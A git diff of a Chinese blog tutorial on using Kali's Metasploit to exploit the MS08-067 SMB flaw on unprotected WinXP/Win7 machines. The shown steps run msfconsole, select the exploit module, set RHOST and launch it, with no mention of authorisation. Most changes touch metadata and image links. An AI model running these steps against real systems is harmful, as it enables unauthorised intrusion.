@@ -1,17 +1,24 @@
 ---
 layout: post
 title: 用kali来黑掉windows
-tags: windows linux 教程
-keywords: windows linux kali 教程 黑
-categoty: tech
-cover: 'https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/cover.jpg'
+tags: windows linux
+categories: Living dump
+img: 'https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/cover.jpg'
 ---
+
+Metasploit Framwork is not a good thing ...
+Oh,no! My computer!
+
+---
+
 ### 前言
-哈喽大家好。我有好久没更新博客了。  
-在这段时间里，我给我的电脑装上了kali。  
+哈喽大家好。我又好久没更新博客了。  
+这段时间里我给我的电脑装上了kali。  
 （耀庄老弟你咋没事找事干呢）  
-其实事情是这样的，前一段时间，我的电脑移到~~其他地方~~办公室去了。然后我去插那边的网线，结果插上是插上了，电脑上也写着连接了，有因特访问。可是，我进百度却进半天都没进去，竟然还连接超时，7456。  
-然后有人看了，说是我电脑的问题，叫我装双系统。Okay，这就是我最近在为kali做准备的原因。  
+其实事情是这样的，前一段时间我的电脑移到~~其他地方~~办公室去了。  
+然后我去插那边的网线，结果插上是插上了，电脑上也写着连接了，有因特访问。可是我进百度却进半天都没进去，竟然还连接超时，7456。  
+我请人看了，说是我电脑的问题，叫我装双系统。Okay，这就是我最近在为kali做准备的原因。  
+耀庄你这是要黑别人的电脑不成？  
 不过话说现在已经没事了，我用上了WIFI网卡。我还在想着入侵入侵入侵。。  
 ~~反正就是一句话，没事找事干😜~~
   
@@ -19,11 +26,7 @@ cover: 'https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kaliha
 - Kali电脑一部
 - 没装防火墙和360卫士或防火墙不稳定的电脑一部
   - 搭载WinXP或Win7
-  - 可以是笔记本也可以是台式机
-
-### 目录
-- 直接攻击
-  - 利用漏洞进行攻击
+  - 可以是笔记本或台式机
 
 ### 01.开启Metasploit
 Metasploit是一个安全渗透软件。Kali可以在终端*root*里输入:  
@@ -31,7 +34,7 @@ Metasploit是一个安全渗透软件。Kali可以在终端*root*里输入:
 msfconsole
 ```
 来打开它。
-![]({{ site.imgbed }}/img/kalihack/01.png)
+![](https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/01.png)
 
 ### 02. 搜索Xp漏洞
 我们可以查看漏洞在这个*安全渗透环境*查看windows的漏洞都有啥的。输入:
@@ -45,7 +48,7 @@ search netapi
 来搜索。  
 之后，你会看到有一个`ms08-netapi`的漏洞，利用等级是`great`。  
 但确保你要攻击的电脑有这个ms08漏洞。如果没有，请试其他。  
-![]({{ site.imgbed }}/img/kalihack/02.png)
+![](https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/02.png)
 
 ### 03.使用ms08漏洞并设置
 使用该内容，输入:
@@ -54,7 +57,7 @@ use exploit/windows/smb/ms08_067netapi
 ```
 你会发现命令的提示符旁边多了`exploit(windows/smb/ms08_067-netapi)`，表示使用成功。
 你可以通过`info *内容名`来详细查看这个内容。
-![]({{ site.imgbed }}/img/kalihack/03.png)
+![](https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/03.png)
 
 ### 04.设置载荷
 载荷可以说是一个会话的类型设置。你可以看到命令的末尾有个`bind_tcp`。  
@@ -78,9 +81,10 @@ set RHOST 192.108.1.104
 ```msf
 exploit
 ```
-![]({{ site.imgbed }}/img/kalihack/04.png)
-![]({{ site.imgbed }}/img/kalihack/05.png)
+![](https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/04.png)
+![](https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/05.png)
 
+>该文章中的所有图片均为网上的图片。如果侵犯到了你的权利，可联系作者来进行删除。
 <br /> <br /> <br />
 
 ***
